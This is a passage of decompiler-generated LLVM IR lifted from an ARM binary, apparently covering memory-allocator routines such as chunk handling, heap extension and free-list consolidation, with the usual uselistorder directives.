  %tmp215 = icmp ugt i32 %v2_15534, %v5_15534
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_15524
  store i32 %v2_15534, i32* %v4_15534, align 4
  %v0_1554c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1554c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_15524, %bb165
  %v1_1554c = phi i32 [ %v3_15540, %dec_label_pc_15524 ], [ %v1_1554c.pre, %bb165 ]
  %v4_15550 = phi i32 [ %v2_15544, %dec_label_pc_15524 ], [ %v0_1554c.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_15550, %v1_1554c
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_15550 = load i32, i32* %lr.global-to-local, align 4
  %v6_15550 = add i32 %v5_15550, 884
  %v7_15550 = inttoptr i32 %v6_15550 to i32*
  store i32 %v4_15550, i32* %v7_15550, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_15554 = load i32, i32* %lr.global-to-local, align 4
  %v1_15554 = add i32 %v0_15554, 44
  %v2_15554 = inttoptr i32 %v1_15554 to i32*
  %v3_15554 = load i32, i32* %v2_15554, align 4
  store i32 %v3_15554, i32* %ip.global-to-local, align 4
  %v1_15558 = add i32 %v3_15554, 4
  %v2_15558 = inttoptr i32 %v1_15558 to i32*
  %v3_15558 = load i32, i32* %v2_15558, align 4
  store i32 %v1_1516c, i32* %r1.global-to-local, align 4
  %v1_15560 = and i32 %v3_15558, -4
  store i32 %v1_15560, i32* %r3.global-to-local, align 4
  %v3_15564 = icmp ult i32 %v1_15560, %v1_1516c
  br i1 %v3_15564, label %dec_label_pc_15590, label %dec_label_pc_1556c

dec_label_pc_1556c:                               ; preds = %bb168
  %v0_1556c = load i32, i32* @sl, align 4
  %v2_1556c = sub i32 %v1_15560, %v0_1556c
  %v2_15570 = add i32 %v0_1556c, %v3_15554
  store i32 %v2_15570, i32* %r1.global-to-local, align 4
  %v1_15574 = or i32 %v2_1556c, 1
  store i32 %v1_15574, i32* %r3.global-to-local, align 4
  %v1_15578 = or i32 %v0_1556c, 1
  store i32 %v1_15578, i32* %r2.global-to-local, align 4
  %v1_1557c = add i32 %v3_15554, 8
  store i32 %v1_1557c, i32* %r0.global-to-local, align 4
  store i32 %v1_15578, i32* %v2_15558, align 4
  %v0_15584 = load i32, i32* %r1.global-to-local, align 4
  %v1_15584 = load i32, i32* %lr.global-to-local, align 4
  %v2_15584 = add i32 %v1_15584, 44
  %v3_15584 = inttoptr i32 %v2_15584 to i32*
  store i32 %v0_15584, i32* %v3_15584, align 4
  %v0_15588 = load i32, i32* %r3.global-to-local, align 4
  %v1_15588 = load i32, i32* %r1.global-to-local, align 4
  %v2_15588 = add i32 %v1_15588, 4
  %v3_15588 = inttoptr i32 %v2_15588 to i32*
  store i32 %v0_15588, i32* %v3_15588, align 4
  br label %dec_label_pc_155a0

dec_label_pc_15590:                               ; preds = %bb157, %bb168, %dec_label_pc_1536c
  %v0_15590 = call i32 @function_12b24()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15598 = inttoptr i32 %v0_15590 to i32*
  store i32 12, i32* %v2_15598, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %bb151, %bb150, %dec_label_pc_1556c, %dec_label_pc_151b4, %dec_label_pc_15590
  %v0_155a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_155a0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155a4

dec_label_pc_155a4:                               ; preds = %.thread1, %dec_label_pc_15180, %.thread121, %dec_label_pc_14ff0, %dec_label_pc_14fe4, %dec_label_pc_14e4c, %dec_label_pc_14dd0, %dec_label_pc_155a0
  store i32 %v2_14cf8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 180260, i32* @r2, align 4
  %v4_155b4 = load i32, i32* inttoptr (i32 180284 to i32*), align 4
  store i32 %v4_155b4, i32* @ip, align 4
  store i32 87488, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_155b4)
  br label %dec_label_pc_155c0

dec_label_pc_155c0:                               ; preds = %dec_label_pc_14d30, %dec_label_pc_155a4
  %v0_155c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_155c0, i32* %r0.global-to-local, align 4
  store i32 %v3_14ccc, i32* @r4, align 4
  store i32 %v6_14ccc, i32* @r5, align 4
  store i32 %v9_14ccc, i32* @r6, align 4
  store i32 %v12_14ccc, i32* @r7, align 4
  store i32 %v15_14ccc, i32* @r8, align 4
  store i32 %v18_14ccc, i32* @sb, align 4
  store i32 %v21_14ccc, i32* @sl, align 4
  store i32 %v24_14ccc, i32* @fp, align 4
  store i32 %v27_14ccc, i32* @lr, align 4
  ret i32 %v0_155c0

; uselistorder directives
  uselistorder i32 %v0_1556c, { 1, 0, 2 }
  uselistorder i32 %v3_15554, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15550, { 1, 0 }
  uselistorder i32 %v2_15534, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1552c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_154e4, { 1, 2, 0 }
  uselistorder i32 %v0_154ac, { 1, 0 }
  uselistorder i32 %v0_154a0, { 1, 0 }
  uselistorder i32 %v2_15490, { 1, 0 }
  uselistorder i32 %v2_15420, { 2, 1, 0 }
  uselistorder i32 %v2_15408, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15400, { 1, 0, 2 }
  uselistorder i32 %v1_153fc, { 2, 1, 0 }
  uselistorder i32 %v0_153fc, { 3, 1, 2, 0 }
  uselistorder i32 %v1_153e0, { 1, 0 }
  uselistorder i32 %v2_153b8, { 1, 0 }
  uselistorder i32 %v3_153ac, { 1, 0, 2 }
  uselistorder i32 %v2_1538c, { 1, 0, 2 }
  uselistorder i32* %v2_15384, { 1, 0, 2 }
  uselistorder i32 %v0_1536c, { 1, 0 }
  uselistorder i32 %v6_15348, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_15334, { 2, 1, 0 }
  uselistorder i32 %v0_1531c, { 1, 0 }
  uselistorder i32 %v2_152d8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_152d4, { 1, 0 }
  uselistorder i32 %v3_152ac, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_1528c, { 1, 0, 2 }
  uselistorder i32 %v2_15274, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1521c, { 2, 1, 0 }
  uselistorder i32 %v6_15210, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_151ec, { 2, 1, 0, 3 }
  uselistorder i32 %v3_151ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1516c, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_15164, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_1514c, { 1, 0 }
  uselistorder i32 %v7_1510c, { 1, 0 }
  uselistorder i32 %v4_1510c, { 1, 0 }
  uselistorder i32 %v0_150dc, { 1, 0 }
  uselistorder i32 %v2_150b0, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_150ac54, { 1, 0 }
  uselistorder i32 %v1_15078, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_15060., { 1, 2, 0 }
  uselistorder i32 %v0_15068, { 0, 1, 3, 2 }
  uselistorder i32 %v1_15068, { 1, 0 }
  uselistorder i32 %v3_15048, { 1, 0 }
  uselistorder i32 %v4_15044, { 1, 0, 2 }
  uselistorder i32 %v1_14fb4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1500c, { 1, 0 }
  uselistorder i32 %v1_14ff0, { 1, 0 }
  uselistorder i32 %v1_14e90, { 1, 0 }
  uselistorder i32 %v0_14fd0, { 2, 0, 1, 3 }
  uselistorder i32 %v3_14f98, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1502c.pre, { 1, 2, 0 }
  uselistorder i32 %v0_14f74, { 2, 1, 0 }
  uselistorder i32 %v3_14f68, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_14e88, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_14f30, { 1, 0 }
  uselistorder i32 %v3_14f24, { 1, 0 }
  uselistorder i32 %v0_14f30, { 1, 0 }
  uselistorder i32 %v3_14f08, { 0, 2, 3, 1 }
  uselistorder i32 %v2_14ef8, { 1, 0, 2 }
  uselistorder i32 %v3_14eb0, { 2, 1, 0 }
  uselistorder i32 %v0_14ea0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14e70, { 1, 0 }
  uselistorder i32 %v1_14e24, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14e20, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_14dc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_14db8, { 1, 0 }
  uselistorder i32 %v3_14d88, { 1, 0 }
  uselistorder i32 %v0_14d7c, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_14d5c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14d50, { 1, 0 }
  uselistorder i32 %v0_14d28, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 2, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 49, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 31, 7, 8, 9, 10, 22, 14, 11, 23, 12, 13, 16, 15, 20, 17, 24, 19, 18, 25, 21, 59, 27, 26, 28, 2, 29, 32, 30, 37, 33, 34, 3, 35, 36, 38, 39, 40, 43, 44, 41, 42, 49, 46, 45, 47, 48, 50, 1, 51, 52, 53, 54, 4, 55, 58, 57, 56, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_172dc, { 1, 0 }
  uselistorder i32 (i32)* @function_14c54, { 1, 0 }
  uselistorder label %dec_label_pc_155c0, { 1, 0 }
  uselistorder label %dec_label_pc_155a4, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_155a0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15590, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_15524, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_154a0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_15498, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1536c, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_152a0, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_15158, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_150ac, { 1, 0 }
  uselistorder label %dec_label_pc_150b4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15078, { 1, 0 }
  uselistorder label %dec_label_pc_1502c, { 1, 0 }
  uselistorder label %dec_label_pc_14fc0, { 1, 0 }
  uselistorder label %dec_label_pc_14fbc, { 1, 0 }
  uselistorder label %dec_label_pc_14f68, { 1, 0 }
  uselistorder label %dec_label_pc_14f54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14f08, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_155d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_155d4:
  %v0_155d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_155d4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_155d4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_155d4, %bb
  %v10_155e8 = phi i32 [ %arg1, %dec_label_pc_155d4 ], [ 0, %bb ]
  ret i32 %v10_155e8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_155ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_155ec:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_155ec = add i32 %arg2, 44
  %v2_155ec = inttoptr i32 %v1_155ec to i32*
  %v3_155ec = load i32, i32* %v2_155ec, align 4
  %v3_155f0 = load i32, i32* @r4, align 4
  store i32 %v3_155f0, i32* %stack_var_-20, align 4
  %v1_155f4 = add i32 %v3_155ec, 4
  %v2_155f4 = inttoptr i32 %v1_155f4 to i32*
  %v3_155f4 = load i32, i32* %v2_155f4, align 4
  %v1_155f8 = add i32 %arg2, 860
  %v2_155f8 = inttoptr i32 %v1_155f8 to i32*
  %v3_155f8 = load i32, i32* %v2_155f8, align 4
  store i32 %v3_155f8, i32* @r4, align 4
  %v1_155fc = and i32 %v3_155f4, -4
  store i32 %v1_155fc, i32* @r6, align 4
  %v1_15600 = add i32 %v1_155fc, -17
  %v2_15604 = add i32 %v1_15600, %v3_155f8
  store i32 %arg2, i32* @r5, align 4
  %v2_15610 = sub i32 %v2_15604, %arg1
  store i32 %v2_15610, i32* @r0, align 4
  store i32 %v3_155f8, i32* @r1, align 4
  %v0_15618 = call i32 @function_12418()
  %v1_1561c = add i32 %v0_15618, -1
  store i32 %v1_1561c, i32* %r0.global-to-local, align 4
  %v0_15620 = load i32, i32* @r4, align 4
  %v2_15620 = mul i32 %v0_15620, %v1_1561c
  store i32 %v2_15620, i32* %r7.global-to-local, align 4
  %v2_15624 = icmp eq i32 %v2_15620, 0
  store i1 %v2_15624, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_15620, 1
  br i1 %tmp8, label %dec_label_pc_1568c, label %dec_label_pc_1562c

dec_label_pc_1562c:                               ; preds = %dec_label_pc_155ec
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15630 = call i32 @function_17524(i32 0)
  store i32 %v1_15630, i32* %r0.global-to-local, align 4
  %v0_15634 = load i32, i32* @r5, align 4
  %v1_15634 = add i32 %v0_15634, 44
  %v2_15634 = inttoptr i32 %v1_15634 to i32*
  %v3_15634 = load i32, i32* %v2_15634, align 4
  %v0_15638 = load i32, i32* @r6, align 4
  %v2_15638 = add i32 %v0_15638, %v3_15634
  %v9_1563c = icmp eq i32 %v1_15630, %v2_15638
  store i1 %v9_1563c, i1* @cpsr_z, align 1
  store i32 %v1_15630, i32* @r4, align 4
  br i1 %v9_1563c, label %dec_label_pc_15648, label %dec_label_pc_1568c

dec_label_pc_15648:                               ; preds = %dec_label_pc_1562c
  %v0_15648 = load i32, i32* %r7.global-to-local, align 4
  %v1_15648 = sub i32 0, %v0_15648
  store i32 %v1_15648, i32* %r0.global-to-local, align 4
  %v1_1564c = call i32 @function_17524(i32 %v1_15648)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15654 = call i32 @function_17524(i32 0)
  store i32 %v1_15654, i32* %r0.global-to-local, align 4
  %v7_15658 = icmp eq i32 %v1_15654, -1
  store i1 %v7_15658, i1* @cpsr_z, align 1
  br i1 %v7_15658, label %dec_label_pc_1568c, label %dec_label_pc_15660

dec_label_pc_15660:                               ; preds = %dec_label_pc_15648
  %v0_15660 = load i32, i32* @r4, align 4
  %v2_15660 = sub i32 %v0_15660, %v1_15654
  store i32 %v2_15660, i32* %r0.global-to-local, align 4
  %v9_15660 = icmp eq i32 %v0_15660, %v1_15654
  store i1 %v9_15660, i1* @cpsr_z, align 1
  br i1 %v9_15660, label %dec_label_pc_1568c, label %dec_label_pc_15668

dec_label_pc_15668:                               ; preds = %dec_label_pc_15660
  %v0_15668 = load i32, i32* @r5, align 4
  %v1_15668 = add i32 %v0_15668, 872
  %v2_15668 = inttoptr i32 %v1_15668 to i32*
  %v3_15668 = load i32, i32* %v2_15668, align 4
  %v1_1566c = load i32, i32* @r6, align 4
  %v2_1566c = sub i32 %v1_1566c, %v2_15660
  %v1_15670 = add i32 %v0_15668, 44
  %v2_15670 = inttoptr i32 %v1_15670 to i32*
  %v3_15670 = load i32, i32* %v2_15670, align 4
  store i32 %v3_15670, i32* %r1.global-to-local, align 4
  %v2_15674 = sub i32 %v3_15668, %v2_15660
  %v1_15678 = or i32 %v2_1566c, 1
  store i32 %v1_15678, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_15674, i32* %v2_15668, align 4
  %v0_15684 = load i32, i32* @r2, align 4
  %v1_15684 = load i32, i32* %r1.global-to-local, align 4
  %v2_15684 = add i32 %v1_15684, 4
  %v3_15684 = inttoptr i32 %v2_15684 to i32*
  store i32 %v0_15684, i32* %v3_15684, align 4
  %v1_15698.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15690

dec_label_pc_1568c:                               ; preds = %dec_label_pc_1562c, %dec_label_pc_15660, %dec_label_pc_15648, %dec_label_pc_155ec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15690

dec_label_pc_15690:                               ; preds = %dec_label_pc_15668, %dec_label_pc_1568c
  %v1_15698 = phi i32 [ %v1_15698.pre, %dec_label_pc_15668 ], [ 0, %dec_label_pc_1568c ]
  %v2_15694 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15694, i32* @r4, align 4
  ret i32 %v1_15698

; uselistorder directives
  uselistorder i1 %v7_15658, { 1, 0 }
  uselistorder i32 %v1_15654, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 (i32)* @function_17524, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15690, { 1, 0 }
  uselistorder label %dec_label_pc_1568c, { 1, 2, 0, 3 }
}

define i32 @function_1569c() local_unnamed_addr {
dec_label_pc_1569c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1569c = load i32, i32* @r4, align 4
  store i32 %v3_1569c, i32* %stack_var_-36, align 4
  %v0_156a0 = load i32, i32* @r0, align 4
  %v1_156a0 = inttoptr i32 %v0_156a0 to i32*
  %v2_156a0 = load i32, i32* %v1_156a0, align 4
  store i32 %v2_156a0, i32* %r3.global-to-local, align 4
  %v2_156a4 = icmp eq i32 %v2_156a0, 0
  store i32 %v0_156a0, i32* @r4, align 4
  br i1 %v2_156a4, label %dec_label_pc_157dc.preheader, label %dec_label_pc_156b8

dec_label_pc_157dc.preheader:                     ; preds = %dec_label_pc_1569c
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_157e425 = add i32 %v0_156a0, 52
  store i32 %v1_157e425, i32* %r3.global-to-local, align 4
  %v2_157ec26 = add i32 %v0_156a0, 60
  %v3_157ec27 = inttoptr i32 %v2_157ec26 to i32*
  store i32 %v1_157e425, i32* %v3_157ec27, align 4
  %v0_157f028 = load i32, i32* %r3.global-to-local, align 4
  %v2_157f029 = add i32 %v0_157f028, 12
  %v3_157f030 = inttoptr i32 %v2_157f029 to i32*
  store i32 %v0_157f028, i32* %v3_157f030, align 4
  br label %dec_label_pc_157dc.dec_label_pc_157dc_crit_edge

dec_label_pc_156b8:                               ; preds = %dec_label_pc_1569c
  %v1_156b8 = and i32 %v2_156a0, -3
  %v3_156bc = udiv i32 %v2_156a0, 8
  store i32 %v3_156bc, i32* %r2.global-to-local, align 4
  store i32 %v1_156b8, i32* %v1_156a0, align 4
  %v0_156c4 = load i32, i32* @r0, align 4
  %v1_156c4 = add i32 %v0_156c4, -4
  store i32 %v1_156c4, i32* %r3.global-to-local, align 4
  %v1_156c8 = load i32, i32* %r2.global-to-local, align 4
  %v4_156c8 = mul i32 %v1_156c8, 4
  %v5_156c8 = add i32 %v4_156c8, %v1_156c4
  store i32 %v5_156c8, i32* %sb.global-to-local, align 4
  %v1_156cc = add i32 %v0_156c4, 52
  store i32 %v1_156cc, i32* %r7.global-to-local, align 4
  %v1_156d0 = add i32 %v0_156c4, 4
  store i32 %v1_156d0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %dec_label_pc_157d4, %dec_label_pc_156b8
  %v1_157cc10 = phi i32 [ %v1_157cc, %dec_label_pc_157d4 ], [ %v5_156c8, %dec_label_pc_156b8 ]
  %v1_156e4 = phi i32 [ %v1_157d4, %dec_label_pc_157d4 ], [ %v1_156d0, %dec_label_pc_156b8 ]
  %v1_156d8 = inttoptr i32 %v1_156e4 to i32*
  %v2_156d8 = load i32, i32* %v1_156d8, align 4
  store i32 %v2_156d8, i32* %r1.global-to-local, align 4
  %v2_156dc = icmp eq i32 %v2_156d8, 0
  br i1 %v2_156dc, label %dec_label_pc_157cc, label %dec_label_pc_156e4

dec_label_pc_156e4:                               ; preds = %dec_label_pc_156d8
  %v0_156e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_156e4, i32* %v1_156d8, align 4
  %v0_156e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_157c0, %dec_label_pc_156e4
  %v0_15704 = phi i32 [ %v0_157c0, %dec_label_pc_157c0 ], [ %v0_156e8.pre, %dec_label_pc_156e4 ]
  %v1_156e8 = add i32 %v0_15704, 4
  %v2_156e8 = inttoptr i32 %v1_156e8 to i32*
  %v3_156e8 = load i32, i32* %v2_156e8, align 4
  store i32 %v3_156e8, i32* %r3.global-to-local, align 4
  %v1_156ec = and i32 %v3_156e8, -2
  store i32 %v1_156ec, i32* %lr.global-to-local, align 4
  %v2_156f0 = add i32 %v1_156ec, %v0_15704
  store i32 %v2_156f0, i32* @r0, align 4
  %v1_156f4 = urem i32 %v3_156e8, 2
  %v2_156f4 = icmp eq i32 %v1_156f4, 0
  %v1_156f8 = add i32 %v0_15704, 8
  %v2_156f8 = inttoptr i32 %v1_156f8 to i32*
  %v3_156f8 = load i32, i32* %v2_156f8, align 4
  store i32 %v3_156f8, i32* %sl.global-to-local, align 4
  %v1_156fc = add i32 %v2_156f0, 4
  %v2_156fc = inttoptr i32 %v1_156fc to i32*
  %v3_156fc = load i32, i32* %v2_156fc, align 4
  store i32 %v3_156fc, i32* %r8.global-to-local, align 4
  br i1 %v2_156f4, label %dec_label_pc_15704, label %dec_label_pc_15738

dec_label_pc_15704:                               ; preds = %dec_label_pc_156e8
  %v1_15704 = inttoptr i32 %v0_15704 to i32*
  %v2_15704 = load i32, i32* %v1_15704, align 4
  store i32 %v2_15704, i32* %r5.global-to-local, align 4
  %v2_15708 = sub i32 %v0_15704, %v2_15704
  store i32 %v2_15708, i32* %r3.global-to-local, align 4
  %v1_1570c = add i32 %v2_15708, 8
  %v2_1570c = inttoptr i32 %v1_1570c to i32*
  %v3_1570c = load i32, i32* %v2_1570c, align 4
  store i32 %v3_1570c, i32* %ip.global-to-local, align 4
  %v1_15710 = add i32 %v3_1570c, 12
  %v2_15710 = inttoptr i32 %v1_15710 to i32*
  %v3_15710 = load i32, i32* %v2_15710, align 4
  store i32 %v3_15710, i32* %r1.global-to-local, align 4
  %v9_15714 = icmp eq i32 %v3_15710, %v2_15708
  %v1_15718 = add i32 %v2_15708, 12
  %v2_15718 = inttoptr i32 %v1_15718 to i32*
  %v3_15718 = load i32, i32* %v2_15718, align 4
  store i32 %v3_15718, i32* %r2.global-to-local, align 4
  br i1 %v9_15714, label %dec_label_pc_15720, label %dec_label_pc_1577c

dec_label_pc_15720:                               ; preds = %dec_label_pc_15704
  %v1_15720 = add i32 %v3_15718, 8
  %v2_15720 = inttoptr i32 %v1_15720 to i32*
  %v3_15720 = load i32, i32* %v2_15720, align 4
  store i32 %v3_15720, i32* %r3.global-to-local, align 4
  %v9_15724 = icmp eq i32 %v3_15720, %v2_15708
  br i1 %v9_15724, label %dec_label_pc_1572c, label %dec_label_pc_1577c

dec_label_pc_1572c:                               ; preds = %dec_label_pc_15720
  store i32 %v3_1570c, i32* %v2_15720, align 4
  %v0_15730 = load i32, i32* %r2.global-to-local, align 4
  %v1_15730 = load i32, i32* %ip.global-to-local, align 4
  %v2_15730 = add i32 %v1_15730, 12
  %v3_15730 = inttoptr i32 %v2_15730 to i32*
  store i32 %v0_15730, i32* %v3_15730, align 4
  %v0_15734 = load i32, i32* %lr.global-to-local, align 4
  %v1_15734 = load i32, i32* %r5.global-to-local, align 4
  %v2_15734 = add i32 %v1_15734, %v0_15734
  store i32 %v2_15734, i32* %lr.global-to-local, align 4
  %v0_1573c.pre = load i32, i32* @r0, align 4
  %v0_15740.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %dec_label_pc_156e8, %dec_label_pc_1572c
  %v0_157b0 = phi i32 [ %v1_156ec, %dec_label_pc_156e8 ], [ %v2_15734, %dec_label_pc_1572c ]
  %v0_15740 = phi i32 [ %v3_156fc, %dec_label_pc_156e8 ], [ %v0_15740.pre, %dec_label_pc_1572c ]
  %v1_15754 = phi i32 [ %v2_156f0, %dec_label_pc_156e8 ], [ %v0_1573c.pre, %dec_label_pc_1572c ]
  %v0_15738 = load i32, i32* @r4, align 4
  %v1_15738 = add i32 %v0_15738, 44
  %v2_15738 = inttoptr i32 %v1_15738 to i32*
  %v3_15738 = load i32, i32* %v2_15738, align 4
  store i32 %v3_15738, i32* %r3.global-to-local, align 4
  %v9_1573c = icmp eq i32 %v1_15754, %v3_15738
  %v1_15740 = and i32 %v0_15740, -4
  store i32 %v1_15740, i32* %r5.global-to-local, align 4
  br i1 %v9_1573c, label %dec_label_pc_157b0, label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_15738
  %v2_15748 = add i32 %v1_15754, %v1_15740
  store i32 %v2_15748, i32* %r3.global-to-local, align 4
  %v1_1574c = add i32 %v2_15748, 4
  %v2_1574c = inttoptr i32 %v1_1574c to i32*
  %v3_1574c = load i32, i32* %v2_1574c, align 4
  store i32 %v3_1574c, i32* %r3.global-to-local, align 4
  %v1_15750 = urem i32 %v3_1574c, 2
  %v2_15750 = icmp eq i32 %v1_15750, 0
  %v2_15754 = add i32 %v1_15754, 4
  %v3_15754 = inttoptr i32 %v2_15754 to i32*
  store i32 %v1_15740, i32* %v3_15754, align 4
